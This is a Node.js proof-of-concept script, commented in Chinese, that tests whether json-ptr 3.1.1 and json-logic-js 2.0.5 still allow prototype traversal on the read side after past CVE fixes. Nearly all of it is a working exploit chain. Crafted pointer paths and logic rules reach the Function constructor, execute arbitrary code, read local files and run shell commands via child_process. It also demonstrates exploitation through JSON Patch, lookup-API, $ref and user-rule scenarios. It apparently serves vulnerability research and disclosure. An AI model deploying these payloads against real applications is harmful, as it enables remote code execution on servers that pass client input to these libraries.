'use strict';
/**
 * 引擎 RCE 端到端验证
 *
 * 两个候选都是活跃维护、数百万周下载的库：
 *   json-ptr      3.1.1   412 万/周   历史 CVE 修的是「path 注入 JS 代码」与「set 侧污染」
 *   json-logic-js 2.0.5   372 万/周   历史 CVE 修的是「method 操作符污染」
 *
 * 要回答的问题：修复之后，读侧还剩下什么？
 */

const path = require('path');
const ROOT = __dirname;
const NM = path.join(ROOT, 'pkgs');
const load = (n) => require(path.join(NM, n));
const ver = (n) => require(path.join(NM, n, 'package.json')).version;

const out = [];
const rec = (id, desc, state, detail) => {
  out.push({ id, desc, state, detail });
  console.log(`  [${state.padEnd(4)}] ${id.padEnd(26)} ${desc}`);
  if (detail) console.log(`         ${detail}`);
};

const { JsonPointer } = load('json-ptr');
const jsonLogic = load('json-logic-js');

console.log('='.repeat(92));
console.log(`json-ptr ${ver('json-ptr')}  |  json-logic-js ${ver('json-logic-js')}  |  node ${process.version}`);
console.log('='.repeat(92));

// ===========================================================================
console.log('\n▍A  json-ptr 3.1.1 —— 写侧有守卫，读侧呢');
// ===========================================================================

const doc = { user: { name: 'alice', role: 'user' } };

// A0 正常用（装置对照）
try {
  const v = JsonPointer.get(doc, '/user/role');
  rec('A0:control', '正常指针 /user/role', v === 'user' ? 'PASS' : 'FAIL', 'got ' + v);
} catch (e) { rec('A0:control', '正常指针', 'FAIL', e.message); }

// A1 写侧守卫是否真的生效（确认不是我打错了方向）
try {
  JsonPointer.set(doc, '/__proto__/pollutedByPtr', 1);
  rec('A1:setGuard', '写侧 /__proto__ 被拦截', 'FAIL', '竟然没拦，说明守卫失效');
} catch (e) {
  rec('A1:setGuard', '写侧 /__proto__ 被拦截', 'PASS', '抛出：' + e.message.slice(0, 50));
}

// A2 读侧同一段
let F = null, a2err = null;
try { F = JsonPointer.get(doc, '/__proto__/constructor/constructor'); } catch (e) { a2err = e.message; }
rec('A2:readBypass', '读侧同一段未被拦截', F === Function ? 'HIT' : (a2err ? 'MISS' : 'MISS'),
    F === Function ? '取到 Function 本体（写侧拦了，读侧没拦）' : String(a2err || typeof F));

// A3 能不能执行
if (F === Function) {
  let r = null;
  try { r = F('return 6*7')(); } catch (e) { }
  rec('A3:exec', '执行任意表达式', r === 42 ? 'HIT' : 'MISS', 'got ' + r);

  // A4 落到读文件
  try {
    const P = F('return process')();
    const fs = P.mainModule.require('fs');
    const txt = fs.readFileSync(path.join(NM, 'json-ptr', 'package.json'), 'utf8');
    rec('A4:readfile', '读本机任意文件', txt.includes('json-ptr') ? 'HIT' : 'MISS', '读到 ' + txt.length + ' 字节');
    // A5 起子进程
    const cp = P.mainModule.require('child_process');
    const o = cp.execSync('echo PTR_RCE_OK', { encoding: 'utf8' }).trim();
    rec('A5:exec_cmd', '执行系统命令', o.includes('PTR_RCE_OK') ? 'HIT' : 'MISS', 'stdout=' + o);
  } catch (e) { rec('A4:readfile', '落地能力', 'MISS', e.message.slice(0, 60)); }
}

// A6 场景：RFC 6902 JSON Patch 服务 —— path 完全由客户端请求体控制
// 用 test 操作（只读，不触发 set 守卫），证明穿越结果可被外部观察到
function handlePatch(docObj, patchOps) {
  const trace = [];
  for (const op of patchOps) {
    if (op.op === 'test') {
      const actual = JsonPointer.get(docObj, op.path);   // ← 客户端给的 path 直接进 get
      trace.push({
        path: op.path,
        actualType: typeof actual,
        matched: String(actual) === String(op.value),
      });
    }
  }
  return trace;
}
try {
  const clientBody = [{
    op: 'test',
    path: '/__proto__/constructor/constructor',
    value: 'function Function() { [native code] }',
  }];
  const res = handlePatch({ user: { name: 'alice' } }, clientBody);
  const t = res[0];
  rec('A6:jsonpatch', 'JSON Patch test 操作：path 可控即穿越',
      t.matched && t.actualType === 'function' ? 'HIT' : 'MISS',
      '客户端拿到 matched=' + t.matched + '，说明服务端把 Function 当数据处理了');
} catch (e) {
  rec('A6:jsonpatch', 'JSON Patch 场景', 'MISS', e.message.slice(0, 70));
}

// A7 场景：通用取值 API —— 服务端把 get 结果回显给客户端
try {
  const lookup = (obj, clientPath) => {
    const v = JsonPointer.get(obj, clientPath);
    return { type: typeof v, text: String(v).slice(0, 60) };
  };
  const r = lookup({ user: { name: 'alice' } }, '/__proto__/constructor/constructor');
  rec('A7:genericApi', '通用取值 API：穿越结果外显', r.type === 'function' ? 'HIT' : 'MISS',
      '返回 type=' + r.type + ' text=' + r.text);
} catch (e) {
  rec('A7:genericApi', '通用取值 API', 'MISS', e.message.slice(0, 60));
}

// A8 场景：JsonReference（$ref 解析，用户提供 schema 时可控）
try {
  const { JsonReference } = load('json-ptr');
  const ref = new JsonReference('/__proto__/constructor/constructor');
  const r = ref.resolve({ user: 1 });
  rec('A8:jsonref', '$ref 解析穿越', r === Function ? 'HIT' : 'MISS', 'resolve 返回 ' + typeof r);
} catch (e) {
  rec('A8:jsonref', '$ref 解析', 'MISS', e.message.slice(0, 70));
}

// ===========================================================================
console.log('\n▍B  json-logic-js 2.0.5 —— 历史修了 method 操作符，var 呢');
// ===========================================================================

const data = { user: { name: 'alice', role: 'user' } };

// B0 正常规则（装置对照）
try {
  const v = jsonLogic.apply({ var: 'user.role' }, data);
  rec('B0:control', '正常规则 {var:"user.role"}', v === 'user' ? 'PASS' : 'FAIL', 'got ' + v);
} catch (e) { rec('B0:control', '正常规则', 'FAIL', e.message); }

// B1 var 路径穿越
let F2 = null, b1err = null;
try { F2 = jsonLogic.apply({ var: '__proto__.constructor.constructor' }, data); } catch (e) { b1err = e.message; }
rec('B1:varBypass', 'var 操作符穿越到 Function', F2 === Function ? 'HIT' : 'MISS',
    F2 === Function ? '取到 Function 本体' : String(b1err || typeof F2));

// B2 历史 CVE 的 method 操作符现在是否已被封（对照，验证修复有效）
try {
  const r = jsonLogic.apply({ method: [{ var: 'user' }, 'constructor', ['return 1']] }, data);
  rec('B2:methodOld', '历史 payload：method+constructor', r === Function ? 'HIT' : 'MISS',
      '返回 ' + typeof r + '（2.0.0 修复后是否仍可达 Function）');
} catch (e) { rec('B2:methodOld', '历史 payload', 'MISS', e.message.slice(0, 60)); }

// B3 var + method 组合：单条规则内完成「取 Function → 调用」
try {
  const rule = {
    method: [
      { var: '__proto__.constructor.constructor' },  // 先拿到 Function
      'call',                                        // 调用 Function.call
      [null, 'return 6*7'],                          // 参数 → 生成新函数
    ],
  };
  const step1 = jsonLogic.apply(rule, data);
  rec('B3:combo1', 'var + method 取到可调用对象', typeof step1 === 'function' ? 'HIT' : 'MISS',
      '返回 ' + typeof step1);

  // 再调一次把函数执行掉
  const rule2 = {
    method: [
      { method: [{ var: '__proto__.constructor.constructor' }, 'call', [null, 'return process.pid']] },
      'call',
      [null],
    ],
  };
  const pid = jsonLogic.apply(rule2, data);
  rec('B4:combo2', '单条规则内完成「取→调」', typeof pid === 'number' && pid > 0 ? 'HIT' : 'MISS',
      'process.pid = ' + pid);
} catch (e) { rec('B3:combo1', 'var + method 组合', 'MISS', e.message.slice(0, 70)); }

// B5 场景：用户自定义规则的规则引擎（规则 JSON 来自用户提交）
try {
  const userSubmittedRule = { var: '__proto__.constructor.constructor' };
  const result = jsonLogic.apply(userSubmittedRule, { user: { role: 'user' } });
  rec('B5:ruleEngine', '用户提交规则场景：直达 Function', result === Function ? 'HIT' : 'MISS',
      '规则即攻击载荷，无需任何额外条件');
} catch (e) { rec('B5:ruleEngine', '规则引擎场景', 'MISS', e.message.slice(0, 60)); }

// ===========================================================================
const hit = out.filter(r => r.state === 'HIT').length;
const miss = out.filter(r => r.state === 'MISS').length;
const ctrlFail = out.filter(r => r.id.includes('control') && r.state === 'FAIL').length;
console.log('\n' + '='.repeat(92));
console.log(`HIT ${hit} / MISS ${miss} | 对照失败 ${ctrlFail}`);
console.log('='.repeat(92));

if (process.argv.includes('--json')) {
  const p = process.argv[process.argv.indexOf('--json') + 1];
  require('fs').writeFileSync(p, JSON.stringify({
    generated_at: new Date().toISOString(),
    versions: { 'json-ptr': ver('json-ptr'), 'json-logic-js': ver('json-logic-js'), node: process.version },
    summary: { hit, miss, control_fail: ctrlFail },
    results: out,
  }, null, 1), 'utf8');
  console.log('JSON: ' + p);
}
